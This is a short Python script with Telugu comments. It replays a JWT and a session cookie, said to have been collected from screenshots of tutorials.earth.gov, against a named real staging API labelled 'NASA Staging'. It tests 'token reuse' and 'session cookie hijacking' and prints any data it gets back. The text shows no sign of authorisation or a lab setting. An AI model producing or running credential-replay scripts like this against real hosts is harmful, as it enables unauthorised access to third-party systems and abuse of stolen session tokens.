import requests

# నువ్వు పంపిన స్క్రీన్‌షాట్ (1000334811) లో ఉన్న టోకెన్ మరియు సెషన్ వివరాలు
# JWT Token (tutorials.earth.gov నుండి సేకరించినది)
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ1NzYwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Session Cookie (1000334818 నుండి సేకరించినది)
session_cookie = "bec9bbdf-879b-445c-9f34-d29c86112358.0a7Ekydca77-F9Gi_yxQtpX94Ac"

target_url = "https://sm2a.staging.earth.gov/api/v1/variables"

print(f"--- [ Starting Deep Investigation on NASA Staging ] ---")

# మెథడ్ 1: JWT Bearer Token తో టెస్టింగ్
print(f"\n[*] Method 1: Testing JWT Token Reuse...")
headers = {
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json"
}

try:
    r1 = requests.get(target_url, headers=headers, timeout=15)
    print(f"    Status Code: {r1.status_code}")
    if r1.status_code == 200:
        print("[+++] SUCCESS: JWT Token is VALID for this domain!")
        print(f"    Data: {r1.text}")
    else:
        print("    [-] JWT Token failed or unauthorized.")

    # మెథడ్ 2: Session Cookie తో టెస్టింగ్
    print(f"\n[*] Method 2: Testing Session Cookie Hijacking...")
    cookies = {"session": session_cookie}
    r2 = requests.get(target_url, cookies=cookies, timeout=15)
    print(f"    Status Code: {r2.status_code}")
    if r2.status_code == 200:
        print("[+++] SUCCESS: Session Cookie is VALID!")
        print(f"    Data: {r2.text}")
    else:
        print("    [-] Session Cookie failed.")

except Exception as e:
    print(f"\n[!] Connection Error: {e}")

print(f"\n--- [ Investigation Completed ] ---")
